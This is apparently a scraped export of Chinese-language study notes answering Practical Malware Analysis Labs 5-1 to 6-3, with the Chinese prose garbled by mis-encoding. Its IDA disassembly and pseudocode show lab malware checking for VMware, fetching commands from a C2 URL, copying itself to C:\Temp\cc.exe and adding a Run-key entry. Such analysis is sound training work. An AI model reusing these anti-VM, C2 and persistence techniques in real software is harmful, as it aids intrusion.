åŒå‡»è¿›å…¥è¿™ä¸ªå˜é‡å­˜å‚¨çš„ä½ç½®ï¼› å³é”®æŸ¥æ‰¾è°ƒç”¨è¿™ä¸ªå˜é‡çš„ä½ç½®ï¼Œå‘ç°å…¶ä¸­ä»…æœ‰ä¸€ä¸ª mov çš„èµ‹å€¼æŒ‡ä»¤ï¼› åŒå‡»è¿›å…¥è¿™ä¸ªä½ç½®ï¼Œå‘ç° eax æ˜¯ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬æ¥ç€æŸ¥çœ‹è¿™ä¸ªå‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼›  .text:100036C2 sub_10003695 endp\r.text:100036C2\r.text:100036C3\r.text:100036C3 ; =============== S U B R O U T I N E =======================================\r.text:100036C3\r.text:100036C3 ; Attributes: bp-based frame\r.text:100036C3\r.text:100036C3 sub_100036C3 proc near ; CODE XREF: sub_10001656+27\u0018p\r.text:100036C3 ; PSLIST+A\u0019p\r.text:100036C3\r.text:100036C3 VersionInformation= _OSVERSIONINFOA ptr -94h\r.text:100036C3\r.text:100036C3 push ebp\r.text:100036C4 mov ebp, esp\r.text:100036C6 sub esp, 94h\r.text:100036CC lea eax, [ebp+VersionInformation]\r.text:100036D2 mov [ebp+VersionInformation.dwOSVersionInfoSize], 94h\r.text:100036DC push eax ; lpVersionInformation\r.text:100036DD call ds:GetVersionExA\r.text:100036E3 cmp [ebp+VersionInformation.dwPlatformId], 2\r.text:100036EA jnz short loc_100036FA\r.text:100036EC cmp [ebp+VersionInformation.dwMajorVersion], 5\r.text:100036F3 jb short loc_100036FA\r.text:100036F5 push 1\r.text:100036F7 pop eax\r.text:100036F8 leave\r.text:100036F9 retn\r.text:100036FA ; --------------------------------------------------------------------------- å¤§æ¦‚æ˜¯åœ¨æ¯”è¾ƒç³»ç»Ÿçš„ç‰ˆæœ¬ã€‚\nQUESTION 10 #   A few hundred lines into the subroutine at 0x1000FF58, a series of comparisons use memcmp to compare strings. What happens if the string comparison to robotwork is successful (when memcmp returns 0)?\n F5 åˆ†æä¼ªä»£ç ï¼Œæœç´¢å­—ç¬¦ä¸² robotworkï¼Œå¯çŸ¥è‹¥å…¶å€¼ä¸º 0ï¼Œåˆ™ä¼šå°†æŸ¥è¯¢æ³¨å†Œè¡¨é¡¹ HKET_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion ä¸­çš„aWorktime å’Œ aWorktimes ,å¹¶å°†å…¶å€¼è¾“å‡ºã€‚\nQUESTION 11 #   What does the export PSLIST do?\n åœ¨ export å‡½æ•°è¡¨ä¸­æŸ¥æ‰¾ PSLISTï¼Œåˆ†æå…¶ä¼ªä»£ç ï¼š\nint __stdcall PSLIST(int a1, int a2, char *Str, int a4)\r{\rint result; // eax\rdword_1008E5BC = 1;\rresult = sub_100036C3();\rif ( result )\r{\rif ( strlen(Str) )\rresult = sub_1000664C(0, Str);\relse\rresult = sub_10006518(0);\r}\rdword_1008E5BC = 0;\rreturn result;\r} å…¶ä¸­ sub_100036C3 è¿™ä¸ªå‡½æ•°å°±æ˜¯ä¹‹å‰åˆ†æçš„åˆ¤æ–­ç³»ç»Ÿç‰ˆæœ¬å·çš„å‡½æ•°ï¼Œè¿›ä¸€æ­¥è§‚å¯Ÿ sub_1000664 çš„å†…å®¹å¤§æ¦‚å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªç»™å¥—æ¥å­—åˆ›å»ºäº†ä¸€ä¸ª shellã€‚\nQUESTION 12 #   Use the graph mode to graph the cross-references from sub_10004E79. Which API functions could be called by entering this function? Based on the API functions alone, what could you rename this function?\n æˆ‘ä»¬åœ¨å·¦ä¾§çš„å‡½æ•°çª—å£ä¸­æ‰¾åˆ° sub_10004E79 è¿™ä¸ªå‡½æ•°ï¼Œç„¶ååœ¨ hex view ä¸­å³é”®ç‚¹å‡»å‡½æ•°åç„¶åæŸ¥çœ‹ xref greph from...ï¼ŒæŸ¥çœ‹å‡½æ•°çš„è°ƒç”¨å›¾å¯ä»¥å¾—åˆ°ä¸‹é¢çš„ä¿¡æ¯ï¼š\nå¯è§è¿™ä¸ªå‡½æ•°è°ƒç”¨äº† GetSystemDefaultLangID è¿™ä¸ªå‡½æ•°ï¼Œè¿˜è°ƒç”¨äº† sub_100038EE è¿™ä¸ªå‡½æ•°ï¼Œåè€…åº”è¯¥æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°ï¼Œæ ¹æ®è¿™äº›ä¿¡æ¯æˆ‘ä»¬çŒœæµ‹è¿™ä¸ªå‡½æ•°åº”è¯¥æ˜¯è·å–ç³»ç»Ÿè¯­è¨€çš„ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å°†å…¶å‘½åä¸º GetSystemLanguageã€‚\nQUESTION 13 #   How many Windows API functions does DllMain call directly? How many at a depth of 2?\n åœ¨ Ida Pro ä¸­ä¾æ¬¡ç‚¹å‡»ï¼šview--\u0026gt;graphs--\u0026gt;Users xrefs chartsï¼Œé€‰æ‹©å‡½æ•°çš„è°ƒç”¨æ ˆæ·±ä¸º 1 å³ä¸ºç›´æ¥è°ƒç”¨ï¼š\nå¯è§ç›´æ¥è°ƒç”¨çš„å‡½æ•°æœ‰ 7 ä¸ªã€‚\næˆ‘ä»¬å¯ä»¥ç”¨åŒæ ·çš„æ–¹å¼å°†å‡½æ•°è°ƒç”¨æ·±åº¦è®¾ç½®ä¸º 2ï¼Œå‘ç°å‡½æ•°å¤ªå¤šäº†ï¼Œæ ¹æœ¬æ•°ä¸è¿‡æ¥ã€‚\nQUESTION 14 #   At 0x10001358, there is a call to Sleep (an API function that takes one parameter containing the number of milliseconds to sleep). Looking backward through the code, how long will the program sleep if this code executes?\n åœ¨ Ida Pro ä¸­æŒ‰ g ç„¶åè¾“å…¥åœ°å€ .text:10001358ï¼š\n.text:10001357 push eax ; dwMilliseconds\r.text:10001358 call ds:Sleep\r.text:1000135E xor ebp, ebp\r.text:10001360 jmp loc_100010B4 æŒ‰ F5 æŸ¥çœ‹ä¼ªä»£ç ï¼š\n...\rv14 = atoi(off_10019020[0] + 13);\rSleep(1000 * v14);\r... ç„¶åå¯¹äº off_10019020 è¿™ä¸ªå…¨å±€æ•°æ®åŒºçš„å­—ç¬¦ä¸²ï¼š\n.data:10019020 off_10019020 dd offset aThisIsCti30 ; DATA XREF: sub_10001074:loc_10001341â†‘r\r.data:10019020 ; sub_10001365:loc_10001632â†‘r ...\r.data:10019020 ; \u0026#34;[This is CTI]30\u0026#34; .data:100192AC aThisIsCti30 db \u0026#39;[This is CTI]30\u0026#39;,0 ; DATA XREF: .data:off_10019020â†‘o æ‰€ä»¥è§‚å¯Ÿç¨‹åºé€»è¾‘æˆ‘ä»¬çŸ¥é“ v14 = 30ï¼Œæ‰€ä»¥ ç¡çœ æ—¶é—´ç­‰äº 30 * 1000ms = 30s\nQUESTION 15 #   At 0x10001701 is a call to socket. What are the three parameters?\n æŒ‰ç…§åŒæ ·çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å…ˆè·³åˆ° 0x10001701 è¿™ä¸ªåœ°å€ï¼š\n.text:100016FB push 6 ; protocol\r.text:100016FD push 1 ; type\r.text:100016FF push 2 ; af\r.text:10001701 call ds:socket æ®æ­¤æˆ‘ä»¬å·²ç»çŸ¥é“ push çš„ä¸‰ä¸ªå†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ Google æ¥æŸ¥çœ‹å®ƒä»¬å¯¹åº”çš„å®ã€‚\nQUESTION 16 #   Using the MSDN page for socket and the named symbolic constants functionality in IDA Pro, can you make the parameters more meaningful? What are the parameters after you apply changes?\n 15 é¢˜ä¸­çš„å¸¸é‡è¢«å®šä¹‰åœ¨ winsock2.h ä¸­ï¼ŒGoogle ä»¥ä¸‹å†…å®¹ MSDN socket symbol å³å¯æœåˆ° MSDN çš„ç½‘å€ï¼šhttps://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-socketã€‚æ‰€ä»¥ä¸‰ä¸ªå‚æ•°ï¼š\n   af=2 type=1 protocol=6     AF_INETï¼ˆIPv4ï¼‰ SOCK_STREAMï¼ˆæµï¼‰ IPPROTOCOL_TCPï¼ˆTCPï¼‰    QUESTION 17 #   Search for usage of the in instruction (opcode 0xED). This instruction is used with a magic string VMXh to perform VMware detection. Is that in use in this malware? Using the cross-references to the function that executes the in instruction, is there further evidence of VMware detection?\n æŒ‰ alt+B ä¹‹åè¾“å…¥æŒ‡ä»¤ in çš„ opcode 0xED å¯ä»¥åœ¨æœç´¢ç»“æœä¸­æ‰¾åˆ°ä¸€ä¸ª in æŒ‡ä»¤ï¼š\n.text:100061DB\tsub_10006196\tin eax, dx æˆ‘ä»¬æŸ¥çœ‹è¿™ä¸ªè°ƒç”¨ä½ç½®çš„ä¼ªä»£ç ï¼š\nchar sub_10006196()\r{\runsigned __int32 v0; // eax\rv0 = __indword(0x5658u);\rreturn 0;\r} é€šè¿‡ cross refrence æŸ¥çœ‹è¿™ä¸ªå‡½æ•°çš„è¢«è°ƒç”¨ä½ç½®ï¼Œå‘ç°æœ‰ä¸‰å¤„è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬æŸ¥çœ‹å…¶ä¸­ç¬¬ä¸€ä¸ªçš„ä¼ªä»£ç ï¼š\nif ( atoi(off_10019034[0] + 13) \u0026amp;\u0026amp; ((unsigned __int8)sub_10006119() || sub_10006196()) )\r{\rsub_10003592(unk_1008E5F0, v7);\rsub_10003592(aFoundVirtualMa, v4);\rresult = sub_10005567(Format);\r} å¦‚æœè¿™ä¸ªå‡½æ•° sub_10006196() è°ƒç”¨äº†è¿”å›ä¸ºçœŸï¼Œåˆ™ä¼šè°ƒç”¨ï¼šFound Virtual Machine,Install Cancel. è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå¯è§è¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨äºæ£€æµ‹æ˜¯å¦ä¸ºè™šæ‹Ÿæœºçš„å‡½æ•°ã€‚\nQUESTION 18 #   Jump your cursor to 0x1001D988. What do you find?\n ä¸€ä¸ªå­˜å‚¨ç€çœ‹èµ·æ¥å¾ˆéšæœºçš„å­—ç¬¦ä¸²ï¼š\n.data:1001D988 a1UUU7461Yu2u10 db \u0026#39;-1::\u0026#39;,27h,\u0026#39;u\u0026lt;\u0026amp;u!=\u0026lt;\u0026amp;u746\u0026gt;1::\u0026#39;,27h,\u0026#39;yu\u0026amp;!\u0026#39;,27h,\u0026#39;\u0026lt;;2u106:101u3:\u0026#39;,27h,\u0026#39;u\u0026#39; QUESTION 19 #   If you have the IDA Python plug-in installed (included with the commercial version of IDA Pro), run Lab05-01.py, an IDA Pro Python script provided with the malware for this book. (Make sure the cursor is at 0x1001D988.) What happens after you run the script?\n åœ¨ File--\u0026gt;Script ä¸­é€‰æ‹© Lab05-01.py è¿™ä¸ªæ–‡ä»¶ï¼š\n.data:1001D988 a1UUU7461Yu2u10 db \u0026#39;xdoor is this backdoor, string decoded for \u0026#39; å¯ä»¥çœ‹åˆ° 0x1001D988 è¿™ä¸ªåœ°å€çš„å†…å®¹å‘ç”Ÿäº†å˜åŒ–ã€‚\nQUESTION 20 #   With the cursor in the same location, how do you turn this data into a single ASCII string?\n æŒ‰ä¸‹é”®ç›˜ä¸Šçš„ Aã€‚\nQUESTION 21 #   Open the script with a text editor. How does it work?\n æ‰“å¼€ï¼š\nsea = ScreenEA()  for i in range(0x00,0x50):  b = Byte(sea+i)  decoded_byte = b ^ 0x55  PatchByte(sea+i,decoded_byte) ScreenEA() å‡½æ•°è·å–äº†å…‰æ ‡æ‰€åœ¨çš„ä½ç½®ï¼ŒPatchByte() å‡½æ•°ç”¨äºå†™å…¥ä¸€ä¸ªå­—èŠ‚ã€‚\nè¿™ä¸ª python è„šæœ¬çš„ä½œç”¨æ˜¯å°†å…‰æ ‡ä¹‹åçš„ 0x50 ä¸ªå­—èŠ‚çš„å†…å®¹ä¸ 0x55 åšå¼‚æˆ–æ“ä½œï¼Œå¹¶å†™å…¥åŸæ¥çš„ä½ç½®ã€‚\n"},{"id":278,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-1/","title":"Lab6 1","section":"06","content":"lab 6-1 #  QUESTION 1 #   What is the major code construct found in the only subroutine called by main?\n åœ¨å·¦ä¾§çš„å‡½æ•°åˆ—è¡¨ä¸­é€‰æ‹© _main ï¼Œç„¶ååœ¨å³ä¾§å¯ä»¥çœ‹åˆ° _main å‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼š\n.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)\r.text:00401040 _main proc near ; CODE XREF: start+AF\u0019p\r.text:00401040\r.text:00401040 var_4 = dword ptr -4\r.text:00401040 argc = dword ptr 8\r.text:00401040 argv = dword ptr 0Ch\r.text:00401040 envp = dword ptr 10h\r.text:00401040\r.text:00401040 push ebp\r.text:00401041 mov ebp, esp\r.text:00401043 push ecx\r.text:00401044 call sub_401000\r.text:00401049 mov [ebp+var_4], eax\r.text:0040104C cmp [ebp+var_4], 0\r.text:00401050 jnz short loc_401056\r.text:00401052 xor eax, eax\r.text:00401054 jmp short loc_40105B\r.text:00401056 ; ---------------------------------------------------------------------------\r.text:00401056\r.text:00401056 loc_401056: ; CODE XREF: _main+10\u0018j\r.text:00401056 mov eax, 1\r.text:0040105B\r.text:0040105B loc_40105B: ; CODE XREF: _main+14\u0018j\r.text:0040105B mov esp, ebp\r.text:0040105D pop ebp\r.text:0040105E retn\r.text:0040105E _main endp æˆ‘ä»¬å‘ç° main å‡½æ•°è°ƒç”¨çš„å”¯ä¸€å­è¿‡ç¨‹æ˜¯åœ¨ .text:00401044 è¿™ä¸ªä½ç½®çš„è°ƒç”¨ sub_401000 è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬æŸ¥çœ‹è¿™ä¸ªå‡½æ•°çš„ä¼ªä»£ç ï¼š\n.text:00401000 ; =============== S U B R O U T I N E =======================================\r.text:00401000\r.text:00401000 ; Attributes: bp-based frame\r.text:00401000\r.text:00401000 sub_401000 proc near ; CODE XREF: _main+4\u0019p\r.text:00401000\r.text:00401000 var_4 = dword ptr -4\r.text:00401000\r.text:00401000 push ebp\r.text:00401001 mov ebp, esp\r.text:00401003 push ecx\r.text:00401004 push 0 ; dwReserved\r.text:00401006 push 0 ; lpdwFlags\r.text:00401008 call ds:InternetGetConnectedState\r.text:0040100E mov [ebp+var_4], eax\r.text:00401011 cmp [ebp+var_4], 0\r.text:00401015 jz short loc_40102B\r.text:00401017 push offset aSuccessInterne ; \u0026#34;Success: Internet Connection\\n\u0026#34;\r.text:0040101C call sub_40105F\r.text:00401021 add esp, 4\r.text:00401024 mov eax, 1\r.text:00401029 jmp short loc_40103A\r.text:0040102B ; ---------------------------------------------------------------------------\r.text:0040102B\r.text:0040102B loc_40102B: ; CODE XREF: sub_401000+15\u0018j\r.text:0040102B push offset aError1_1NoInte ; \u0026#34;Error 1.1: No Internet\\n\u0026#34;\r.text:00401030 call sub_40105F\r.text:00401035 add esp, 4\r.text:00401038 xor eax, eax\r.text:0040103A\r.text:0040103A loc_40103A: ; CODE XREF: sub_401000+29\u0018j\r.text:0040103A mov esp, ebp\r.text:0040103C pop ebp\r.text:0040103D retn\r.text:0040103D sub_401000 endp ä¸»è¦çš„ä»£ç ç»“æ„æ˜¯ .text:00401011 ä¸ .text:00401015 è¿™ä¸¤è¡Œæ„æˆçš„ if è¯­å¥çš„æ±‡ç¼–ä»£ç ã€‚æŒ‰ç©ºæ ¼é”®æŸ¥çœ‹ cfg æ›´åŠ ç›´è§‚ã€‚\nQUESTION 2 #   What is the subroutine located at 0x40105F?\n 0x40105F æ˜¯ä¸€ä¸ªå­è¿‡ç¨‹çš„å…¥å£åœ°å€ï¼Œä¹Ÿæ˜¯åœ¨ç¬¬ä¸€é—®ä¸­å¾—åˆ°çš„ main å‡½æ•°è°ƒç”¨å”¯ä¸€å­è¿‡ç¨‹ä¸­ï¼Œå¦‚æœ InternateGetConnectedState å‡½æ•°çš„è¿”å›å€¼å¦‚æœä¸ä¸º 0 çš„è°ƒç”¨å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¼ªä»£ç ä¸ºï¼š\nint __cdecl sub_40105F(int a1, int a2)\r{\rint v2; // edi@1\rint v3; // ebx@1\rv2 = _stbuf(\u0026amp;stru_407098);\rv3 = sub_401282(\u0026amp;stru_407098, a1, (int)\u0026amp;a2);\r_ftbuf(v2, \u0026amp;stru_407098);\rreturn v3;\r} å…¶ä¸­ï¼Œå®šä¹‰åœ¨ stru_407098 çš„ç»“æ„æ˜¯æ–‡ä»¶ï¼š\n.data:00407098 ; FILE stru_407098\r.data:00407098 stru_407098 FILE \u0026lt;0, 0, 0, 2, 1, 0, 0, 0\u0026gt; ; DATA XREF: sub_40105F+2\u0018o\r.data:00407098 ; __stbuf+12\u0018o ... å‡½æ•° sub_401282 æ˜¯ä¸€ä¸ªå¾ˆé•¿çš„å‡½æ•°ã€‚\næˆ‘ä»¬å°è¯•å¯»æ‰¾è°ƒç”¨ sub_40105F è¿™ä¸ªå‡½æ•°çš„ä½ç½®ä¼ å…¥çš„å‚æ•°æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬å‘ç°ä¼ å…¥çš„æ˜¯ Success: Internet Connection ä¸ Error 1.1: No Internet è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ï¼Œ\nQUESTION 3 #   What is the purpose of this program?\n å› ä¸º sub_401282 è¿™ä¸ªç¨‹åºçš„ç»“æ„è¿‡äºå¤æ‚ä¸äºˆç ”ç©¶çš„è¯ï¼Œæ ¹æ®å‡½æ•°è¡Œä¸ºåˆ¤æ–­ï¼Œè¿™ä¸ªç¨‹åºä»…ä»…é€šè¿‡ InternateGetConnectedState() è¿™ä¸ªå‡½æ•°æ£€æµ‹æ˜¯å¦æœ‰æœ‰ç½‘ç»œè¿æ¥ã€‚\n"},{"id":279,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-2/","title":"Lab6 2","section":"06","content":"lab 6-2 #  QUESTION 1 #   What operation does the first subroutine called by main perform?\n æŸ¥çœ‹ _main çš„æ±‡ç¼–ä»£ç ï¼š\n.text:00401130 ; =============== S U B R O U T I N E =======================================\r.text:00401130\r.text:00401130 ; Attributes: bp-based frame\r.text:00401130\r.text:00401130 ; int __cdecl main(int argc, const char **argv, const char **envp)\r.text:00401130 _main proc near ; CODE XREF: start+AF\u0019p\r.text:00401130\r.text:00401130 var_8 = byte ptr -8\r.text:00401130 var_4 = dword ptr -4\r.text:00401130 argc = dword ptr 8\r.text:00401130 argv = dword ptr 0Ch\r.text:00401130 envp = dword ptr 10h\r.text:00401130\r.text:00401130 push ebp\r.text:00401131 mov ebp, esp\r.text:00401133 sub esp, 8\r.text:00401136 call sub_401000\r...... å¯è§è¿™ä¸ªæ±‡ç¼–ä»£ç è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå­è¿‡ç¨‹æ˜¯ sub_401000ï¼ŒåŒæ ·çš„æŸ¥çœ‹å®ƒçš„ä¼ªä»£ç ï¼š\nsigned int sub_401000()\r{\rsigned int result; // eax@2\rif ( InternetGetConnectedState(0, 0) )\r{\rsub_40117F(aSuccessInterne);\rresult = 1;\r}\relse\r{\rsub_40117F(aError1_1NoInte);\rresult = 0;\r}\rreturn result;\r} è¿™ä¹Ÿæ˜¯ä¸€ä¸ªåˆ¤æ–­ç½‘ç»œè¿æ¥çŠ¶æ€çš„å‡½æ•°ã€‚\nQUESTION 2 #   What is the subroutine located at 0x40117F?\n è·³è½¬åˆ°è¿™ä¸ªåœ°å€ä¹‹åæŸ¥çœ‹è¿™ä¸ªå­è¿‡ç¨‹çš„ä¼ªä»£ç ï¼š\nint sub_40117F(const char *a1, ...) {  int v1; // edi@1  int v2; // ebx@1  va_list va; // [sp+14h] [bp+8h]@1   va_start(va, a1);  v1 = _stbuf(\u0026amp;stru_407160);  v2 = sub_4013A2(\u0026amp;stru_407160, (int)a1, (int)va);  _ftbuf(v1, \u0026amp;stru_407160);  return v2; } è¿™ä¸ªè·Ÿå‰é¢ä¸€é¢˜çš„ printf å†…å®¹æ˜¯ç±»ä¼¼çš„ã€‚åº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ª printf å‡½æ•°ã€‚\nQUESTION 3 #   What does the second subroutine called by main do?\n å…ˆæ‰¾åˆ° main å‡½æ•°çš„è°ƒç”¨çš„ç¬¬äºŒä¸ªå­è¿‡ç¨‹ï¼Œæ˜¯åœ¨ .text:401148 ä½ç½®è°ƒç”¨çš„å‡½æ•° sub_401040ã€‚\nchar sub_401040() {  char result; // al@2  char Buffer; // [sp+0h] [bp-210h]@3  char v2; // [sp+1h] [bp-20Fh]@6  char v3; // [sp+2h] [bp-20Eh]@7  char v4; // [sp+3h] [bp-20Dh]@8  char v5; // [sp+4h] [bp-20Ch]@9  HINTERNET hFile; // [sp+200h] [bp-10h]@1  HINTERNET hInternet; // [sp+204h] [bp-Ch]@1  DWORD dwNumberOfBytesRead; // [sp+208h] [bp-8h]@3  int v9; // [sp+20Ch] [bp-4h]@3   hInternet = InternetOpenA(szAgent, 0, 0, 0, 0);  hFile = InternetOpenUrlA(hInternet, szUrl, 0, 0, 0, 0);  if ( hFile )  {  v9 = InternetReadFile(hFile, \u0026amp;Buffer, 0x200u, \u0026amp;dwNumberOfBytesRead);  if ( v9 )  {  if ( Buffer != 60 || v2 != 33 || v3 != 45 || v4 != 45 )  {  sub_40117F(aError2_3FailTo);  result = 0;  }  else  {  result = v5;  }  }  else  {  sub_40117F(aError2_2FailTo);  InternetCloseHandle(hInternet);  InternetCloseHandle(hFile);  result = 0;  }  }  else  {  sub_40117F(aError2_1FailTo);  InternetCloseHandle(hInternet);  result = 0;  }  return result; } æˆ‘ä»¬é€ä¸ªåˆ†æï¼Œå¯¹äºï¼š\nhInternet = InternetOpenA(szAgent, 0, 0, 0, 0); // szAgent ==\u0026gt; å­—ç¬¦å¸¸é‡ Internet Explorer 7.5/pma è¿™ä¸€è¡Œä»£ç é€šè¿‡ Internet Explorer 7.5 æ‰“å¼€äº†ä¸€ä¸ªæµè§ˆå™¨ã€‚\nå¯¹äºï¼š\nhFile = InternetOpenUrlA(hInternet, szUrl, 0, 0, 0, 0); // szUrl ==\u0026gt; å­—ç¬¦å¸¸é‡ http://www.practicalmalwareanalysis.com/cc.htm è¿™ä¸€è¡Œä»£ç åœ¨ä¹‹å‰æ‰“å¼€çš„æµè§ˆå™¨ä¸­æ‰“å¼€äº†ä¸€ä¸ªé“¾æ¥ http://www.practicalmalwareanalysis.com/cc.htmã€‚\nå¯¹äºï¼š\nv9 = InternetReadFile(hFile, \u0026amp;Buffer, 0x200u, \u0026amp;dwNumberOfBytesRead); è¿™ä¸€è¡Œä»£ç å°†æ‰“å¼€çš„ç½‘é¡µè¯»å…¥å˜é‡ä¸­ã€‚\nå¯¹äºï¼š\nsub_40117F(aError2_3FailTo); // aError2_3FailTo ==\u0026gt; å­—ç¬¦å¸¸é‡ Error 2.3: Fail to get command ...... sub_40117F(aError2_2FailTo); // aError2_3FailTo ==\u0026gt; å­—ç¬¦å¸¸é‡ Error 2.2: Fail to ReadFile ...... sub_40117F(aError2_1FailTo); // aError2_1FailTo ==\u0026gt; å­—ç¬¦å¸¸é‡ Error 2.1: Fail to OpenUrl éƒ½æ˜¯ç”¨äºæŠ›å‡ºå¼‚å¸¸ã€é”™è¯¯çš„å‡½æ•°ã€‚\nç»“è®ºï¼šç»¼ä¸Šæ‰€è¿°ï¼Œè¿™ä¸ªå‡½æ•°ç”¨äºè¯»å– http://www.practicalmalwareanalysis.com/cc.htm çš„å†…å®¹ï¼Œå¹¶ä¸”å°†å…¶ä½œä¸ºå‡½æ•°çš„è¿”å›ç»“æœè¿”å›ã€‚è¯»å–å¤±è´¥ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚\nQUESTION 4 #   What type of code construct is used in this subroutine?\n ä¸»è¦æ˜¯ if è¯­å¥ã€‚\nQUESTION 5 #   Are there any network-based indicators for this program?\n æœ‰ã€‚ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç‚¹ï¼š\n é™æ€åˆ†æè¿™ä¸ªåº”ç”¨ç¨‹åºå¼•ç”¨çš„åŠ¨æ€é“¾æ¥åº“ï¼Œæœ‰è°ƒç”¨ç½‘ç»œç›¸å…³çš„ API å‡½æ•°ï¼› åŠ¨æ€åˆ†æè¿™ä¸ªåº”ç”¨ç¨‹åºï¼Œè¿è¡Œè¿™ä¸ªåº”ç”¨ç¨‹åºå°†æ£€æµ‹åˆ° DNS è¯·æ±‚ã€‚ è¿™ä¸ªåº”ç”¨åº”ç”¨ç¨‹åºçš„å…¨å±€å˜é‡ï¼ˆå­—ç¬¦ä¸²ï¼‰åŒºæœ‰ http://www.practicalmalwareanalysis.com/cc.htm è¿™æ ·çš„å­—ç¬¦ä¸²ã€‚  QUESTION 6 #   What is the purpose of this malware?\n æˆ‘ä»¬å°è¯•æŠŠç½‘é¡µå°è¯•ä¸‹è½½çš„å†…å®¹ä¸‹è½½ä¸‹æ¥ï¼š\n$ wget http://www.practicalmalwareanalysis.com/cc.htm --2019-06-05 15:00:49-- http://www.practicalmalwareanalysis.com/cc.htm Resolving www.practicalmalwareanalysis.com (www.practicalmalwareanalysis.com)... 192.0.78.24, 192.0.78.25 Connecting to www.practicalmalwareanalysis.com (www.practicalmalwareanalysis.com)|192.0.78.24|:80... connected. HTTP request sent, awaiting response... 301 Moved Permanently Location: https://www.practicalmalwareanalysis.com/cc.htm [following] --2019-06-05 15:00:50-- https://www.practicalmalwareanalysis.com/cc.htm Connecting to www.practicalmalwareanalysis.com (www.practicalmalwareanalysis.com)|192.0.78.24|:443... connected. ä¸€ç›´å¡åœ¨äº†è¿™ä¸ªä½ç½®ã€‚æˆ‘ä»¬ç›´æ¥ç”¨ Chrome è®¿é—®å‘ç°å‡ºç°äº† 404 é”™è¯¯ã€‚\næš‚æ—¶ä¸æ¸…æ¥šè¿™ä¸ªæ¶æ„ä»£ç çš„ä½œç”¨ã€‚\n"},{"id":280,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-3/","title":"Lab6 3","section":"06","content":"lab 6-3 #  QUESTION 1 #   Compare the calls in main to Lab 6-2â€™s main method. What is the new function called from main?\n åé¢å¤šå‡ºäº† sub_401130 è¿™ä¸ªå‡½æ•°ã€‚\nQUESTION 2 #   What parameters does this new function take?\n Ida Pro å°†å‡½æ•°å£°æ˜ç”Ÿæˆäº†ä»¥ä¸‹çš„ä¼ªä»£ç ï¼š\nint __cdecl sub_401130(char, LPCSTR lpExistingFileName) å…¶ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦å‹çš„å˜é‡ï¼Œä¸€ä¸ªæŒ‡å‘æ–‡ä»¶åçš„å­—ç¬¦æŒ‡é’ˆã€‚\nQUESTION 3 #   What major code construct does this function contain?\n ä¸»è¦æ˜¯ä¸€ä¸ª switch case è¯­å¥ï¼š\nvoid __cdecl sub_401130(char a1, LPCSTR lpExistingFileName) {  HKEY phkResult; // [sp+4h] [bp-4h]@5   switch ( a1 )  {  case 97:  CreateDirectoryA(PathName, 0);  break;  case 98:  CopyFileA(lpExistingFileName, (LPCSTR)Data, 1);  break;  case 99:  DeleteFileA((LPCSTR)Data);  break;  case 100:  RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, 0xF003Fu, \u0026amp;phkResult);  if ( RegSetValueExA(phkResult, ValueName, 0, 1u, Data, 0xFu) )  sub_401271(aError3_1CouldN);  break;  case 101:  Sleep(0x186A0u);  break;  default:  sub_401271(aError3_2NotAVa);  break;  } } QUESTION 4 #   What can this function do?\n è§‚å¯Ÿä¸Šé¢çš„ä¼ªä»£ç å®¹æ˜“çš„åˆ°è¿™ä¸ªå‡½æ•°çš„é€»è¾‘ï¼š\n   ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å‚æ•° æ‰§è¡Œçš„åŠ¨ä½œ     chr(97) = a åˆ›å»ºæ–‡ä»¶å¤¹ PathName = C:\\Temp   chr(98) = b å¤åˆ¶æ–‡ä»¶ lpExistingFileNameï¼ˆä¼ å…¥çš„å‚æ•°ï¼‰åˆ° Data = C:\\Temp\\cc.exe   chr(99) = c åˆ é™¤æ–‡ä»¶ Data = C:\\Temp\\cc.exe   chr(100) = d æ‰“å¼€æ³¨å†Œè¡¨é¡¹ Software\\Microsoft\\Windows\\CurrentVersion\\Runï¼Œ\nå¹¶ä¸”å°†å…¶å€¼è®¾ç½®ä¸º ValueName = Malware   chr(101) = e ç¡çœ  0x186A0 = 100 000ms = 100s   é»˜è®¤ æŠ¥é”™ Error 3.2: Not a valid command provided    QUESTION 5 #   Are there any host-based indicators for this malware?\n ä¸€ä¸ªæ³¨å†Œè¡¨çš„æ›´æ”¹å’Œä¸€ä¸ªæ–‡ä»¶çš„åˆ›å»º C:\\Temp\\cc.exeã€‚\nQUESTION 6 #   What is the purpose of this malware?\n 